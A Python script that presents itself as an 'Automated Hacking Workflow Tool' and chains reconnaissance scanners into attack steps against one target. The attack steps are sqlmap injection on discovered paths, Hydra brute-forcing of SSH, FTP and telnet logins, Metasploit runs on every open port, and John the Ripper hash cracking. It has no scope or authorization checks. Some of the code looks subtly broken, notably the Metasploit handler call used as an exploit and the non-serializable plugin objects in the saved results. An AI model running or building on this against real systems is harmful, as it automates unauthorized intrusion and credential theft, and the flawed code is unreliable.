import argparse
import yaml
import subprocess
import re
import os
import importlib
import logging
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep

# Logger Setup
def setup_logging(log_level=logging.DEBUG, log_file='logs/hacking_tool.log'):
    logging.basicConfig(filename=log_file, level=log_level,
                        format='%(asctime)s - %(levelname)s - %(message)s')

def log_info(message):
    logging.info(message)

def log_warning(message):
    logging.warning(message)

def log_error(message):
    logging.error(message)

# Command Runner with Retries
def run_command(command, retries=3, delay=2):
    attempt = 0
    while attempt < retries:
        try:
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            attempt += 1
            log_error(f"Command {' '.join(e.cmd)} failed with exit code {e.returncode}, attempt {attempt}/{retries}")
            log_error(f"Error Output: {e.stderr}")
            if attempt < retries:
                sleep(delay)
            else:
                return None

# Configuration Management
def load_config(config_file):
    try:
        with open(config_file, 'r') as file:
            return yaml.safe_load(file)
    except Exception as e:
        log_error(f"Failed to load configuration: {e}")
        return None

# Target Enumeration and Validation
def resolve_target(target):
    if re.match(r'\d+\.\d+\.\d+\.\d+', target):
        return target
    else:
        try:
            ip = subprocess.check_output(["dig", "+short", target]).decode().strip()
            if not ip:
                log_error(f"Failed to resolve IP for target {target}")
                return None
            return ip
        except subprocess.CalledProcessError as e:
            log_error(f"Failed to resolve IP for target {target}: {e}")
            return None

def validate_target(target_ip):
    command = ["ping", "-c", "1", target_ip]
    log_info(f"Validating target IP with command: {' '.join(command)}")
    if run_command(command):
        log_info(f"Target {target_ip} is reachable.")
        return True
    else:
        log_error(f"Target {target_ip} is not reachable.")
        return False

# Scanning and Enumeration Tools
def run_nmap(workflow_data):
    ip = workflow_data['target_ip']
    port_range = workflow_data['config']['nmap']['port_range']
    command = ["nmap", "-sV", "-p", port_range, ip]
    log_info(f"Running nmap with command: {' '.join(command)}")
    output = run_command(command, retries=workflow_data['config']['nmap']['retries'])
    if output:
        workflow_data['nmap_output'] = output
        workflow_data['open_ports'] = extract_open_ports(output)
    else:
        log_error("nmap failed to execute successfully.")

def extract_open_ports(nmap_output):
    pattern = r"(\d+)/tcp\s+open\s+([\w\-]+)"
    return re.findall(pattern, nmap_output)

def run_gobuster(workflow_data):
    command = ["gobuster", "dir", "-u", f"http://{workflow_data['target_ip']}/",
               "-w", workflow_data['wordlist'], "-b", "404,302"]
    log_info(f"Running gobuster with command: {' '.join(command)}")
    output = run_command(command, retries=workflow_data['config']['gobuster']['retries'])
    if output:
        workflow_data['gobuster_output'] = output
        workflow_data['directories'] = extract_directories(output)
    else:
        log_error("gobuster failed to execute successfully.")

def extract_directories(gobuster_output):
    pattern = r"(/\S+)\s+\(Status: 200\)"
    return re.findall(pattern, gobuster_output)

def run_whatweb(workflow_data):
    url = f"http://{workflow_data['target_ip']}"
    command = ["whatweb", url]
    log_info(f"Running WhatWeb with command: {' '.join(command)}")
    output = run_command(command, retries=workflow_data['config']['whatweb']['retries'])
    if output:
        workflow_data['whatweb_output'] = output
        workflow_data['technologies'] = extract_technologies(output)
    else:
        log_error("WhatWeb failed to execute successfully.")

def extract_technologies(whatweb_output):
    pattern = r"\[\+\] (\S+): (\S+)"
    return re.findall(pattern, whatweb_output)

def run_nikto(workflow_data):
    url = f"http://{workflow_data['target_ip']}"
    command = ["nikto", "-h", url]
    log_info(f"Running Nikto with command: {' '.join(command)}")
    output = run_command(command, retries=workflow_data['config']['nikto']['retries'])
    if output:
        workflow_data['nikto_output'] = output
    else:
        log_error("Nikto failed to execute successfully.")

def run_sslscan(workflow_data):
    ip = workflow_data['target_ip']
    command = ["sslscan", ip]
    log_info(f"Running SSLScan with command: {' '.join(command)}")
    output = run_command(command, retries=workflow_data['config']['sslscan']['retries'])
    if output:
        workflow_data['sslscan_output'] = output
    else:
        log_error("SSLScan failed to execute successfully.")

def run_wpscan(workflow_data):
    url = f"http://{workflow_data['target_ip']}"
    command = ["wpscan", "--url", url, "--no-banner"]
    log_info(f"Running WPScan with command: {' '.join(command)}")
    output = run_command(command, retries=workflow_data['config']['wpscan']['retries'])
    if output:
        workflow_data['wpscan_output'] = output
    else:
        log_error("WPScan failed to execute successfully.")

# Exploitation Tools
def run_sqlmap(workflow_data):
    for directory in workflow_data['directories']:
        target_url = f"http://{workflow_data['target_ip']}{directory}"
        command = ["sqlmap", "-u", target_url, "--batch"]
        log_info(f"Running sqlmap with command: {' '.join(command)}")
        result = run_command(command, retries=workflow_data['config']['sqlmap']['retries'])
        if result:
            workflow_data['sqlmap_output'] = result
        else:
            log_error(f"sqlmap failed for {target_url}.")

def run_metasploit(workflow_data):
    ip = workflow_data['target_ip']
    open_ports = workflow_data.get('open_ports', [])
    if open_ports:
        log_info("Running Metasploit for exploitation...")
        for port, service in open_ports:
            log_info(f"Attempting exploitation on {ip}:{port} with service {service}")
            command = ["msfconsole", "-q", "-x", f"use exploit/multi/handler; set RHOST {ip}; set RPORT {port}; run"]
            run_command(command, retries=workflow_data['config']['metasploit']['retries'])
    else:
        log_warning("No open ports found; skipping Metasploit exploitation.")

def run_hydra(workflow_data):
    for port, service in workflow_data['open_ports']:
        if service in ["ssh", "ftp", "telnet"]:
            command = ["hydra", "-L", "usernames.txt", "-P", "passwords.txt", f"{workflow_data['target_ip']}", service,
                       "-s", port]
            log_info(f"Running Hydra on {workflow_data['target_ip']}:{port} for {service}")
            output = run_command(command, retries=workflow_data['config']['hydra']['retries'])
            if output:
                workflow_data['hydra_output'] = output
            else:
                log_error("Hydra failed to execute successfully.")

def run_john(workflow_data):
    if "hashes" in workflow_data:
        with open("hashes.txt", "w") as hash_file:
            hash_file.write("\n".join(workflow_data["hashes"]))
        command = ["john", "hashes.txt"]
        log_info("Running John the Ripper for password cracking...")
        output = run_command(command, retries=workflow_data['config']['john']['retries'])
        if output:
            workflow_data['john_output'] = output
        else:
            log_error("John the Ripper failed to execute successfully.")

# Plugin System
def load_plugins(plugin_dir="plugins"):
    plugins = {}
    for filename in os.listdir(plugin_dir):
        if filename.endswith(".py") and filename != "plugin_interface.py":
            module_name = f"{plugin_dir}.{filename[:-3]}"
            try:
                module = importlib.import_module(module_name)
                for attr in dir(module):
                    if attr.lower().endswith("plugin"):
                        plugin_class = getattr(module, attr)
                        plugins[attr.lower()] = plugin_class()
                        log_info(f"Loaded plugin: {attr.lower()}")
            except Exception as e:
                log_error(f"Failed to load plugin {module_name}: {e}")
    return plugins

def validate_plugin_requirements(plugin, workflow_data):
    required_fields = plugin.required_fields()
    missing_fields = [field for field in required_fields if field not in workflow_data]
    if missing_fields:
        log_error(f"Missing required fields for plugin {plugin.__class__.__name__}: {', '.join(missing_fields)}")
        return False
    return True

class PluginInterface:
    def run(self, workflow_data):
        raise NotImplementedError("Plugins must implement the run method")

    def required_fields(self):
        return []

class ExamplePlugin(PluginInterface):
    def required_fields(self):
        return ['target_ip', 'directories']

    def run(self, workflow_data):
        if not validate_plugin_requirements(self, workflow_data):
            return
        log_info("Running example plugin...")
        workflow_data['vulnerabilities'].append("Example vulnerability found by plugin")

# Workflow Execution
def run_parallel_scans(workflow_data):
    with ThreadPoolExecutor() as executor:
        futures = [
            executor.submit(run_nmap, workflow_data),
            executor.submit(run_gobuster, workflow_data),
            executor.submit(run_whatweb, workflow_data),
            executor.submit(run_sslscan, workflow_data),
            executor.submit(run_nikto, workflow_data),
        ]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                log_error(f"Error during execution: {e}")

def intelligent_tool_selection(workflow_data):
    log_info("Intelligently selecting tools based on previous scan results...")

    # If web technologies are identified, run Nikto and WPScan (if WordPress is detected)
    if workflow_data.get('technologies'):
        run_nikto(workflow_data)
        if any("wordpress" in tech for tech, _ in workflow_data['technologies']):
            run_wpscan(workflow_data)

    # Run SQLMap on identified directories if applicable
    if workflow_data.get('directories'):
        run_sqlmap(workflow_data)

    # Run Hydra for brute-forcing login credentials on services
    run_hydra(workflow_data)

    # Run Metasploit if open ports are found
    if workflow_data.get('open_ports'):
        run_metasploit(workflow_data)

    # If hashes are discovered in any scans, run John the Ripper to crack them
    if "hashes" in workflow_data:
        run_john(workflow_data)

def execute_workflow(config_data, workflow_data):
    run_parallel_scans(workflow_data)
    intelligent_tool_selection(workflow_data)

    # Run additional plugins if any
    for step in config_data['workflow']['steps']:
        if step['enabled'] and step['tool'].startswith("plugin_"):
            plugin_name = step['tool'].split("plugin_")[1]
            plugin = workflow_data['plugins'].get(plugin_name)
            if plugin and validate_plugin_requirements(plugin, workflow_data):
                plugin.run(workflow_data)
            else:
                log_error(f"Plugin '{plugin_name}' not found or missing requirements.")

# Result Storage and Reporting
def save_results(workflow_data):
    if not os.path.exists("results"):
        os.makedirs("results")
    with open(f"results/{workflow_data['target_ip']}_results.json", "w") as file:
        json.dump(workflow_data, file, indent=4)
    log_info(f"Results saved to results/{workflow_data['target_ip']}_results.json")

def log_summary(workflow_data):
    log_info("Execution Summary:")
    log_info(f"Target: {workflow_data['target_ip']}")
    if 'open_ports' in workflow_data:
        log_info(f"Open Ports: {workflow_data['open_ports']}")
    if 'directories' in workflow_data:
        log_info(f"Directories Found: {workflow_data['directories']}")
    if 'technologies' in workflow_data:
        log_info(f"Technologies Detected: {workflow_data['technologies']}")
    if 'vulnerabilities' in workflow_data:
        log_info(f"Vulnerabilities: {workflow_data['vulnerabilities']}")

# Main Function
def main():
    parser = argparse.ArgumentParser(description="Automated Hacking Workflow Tool")
    parser.add_argument("target", help="Target IP address or URL")
    parser.add_argument("-c", "--config", help="Path to configuration file", default="config.yaml")
    parser.add_argument("-l", "--log-level", help="Set the logging level", default="DEBUG")
    parser.add_argument("-lf", "--log-file", help="Set the log file path", default="logs/hacking_tool.log")
    args = parser.parse_args()

    log_level = getattr(logging, args.log_level.upper(), logging.DEBUG)
    setup_logging(log_level, args.log_file)

    # Load configuration
    config_data = load_config(args.config)
    if config_data is None:
        log_error("Failed to load configuration file. Exiting.")
        return

    # Determine if the target is an IP address or a URL and set it up
    target_ip = resolve_target(args.target)
    if not target_ip or not validate_target(target_ip):
        log_error("Target validation failed. Exiting.")
        return

    workflow_data = {
        "target_ip": target_ip,
        "hostname": config_data['target'].get('hostname', target_ip),
        "protocol": config_data['target'].get('protocol', 'http'),
        "wordlist": config_data['wordlists']['gobuster'],
        "open_ports": [],
        "directories": [],
        "technologies": [],
        "vulnerabilities": [],
        "hashes": [],
        "plugins": load_plugins(),
        "config": config_data['tools']
    }

    execute_workflow(config_data, workflow_data)
    save_results(workflow_data)
    log_summary(workflow_data)

if __name__ == "__main__":
    main()
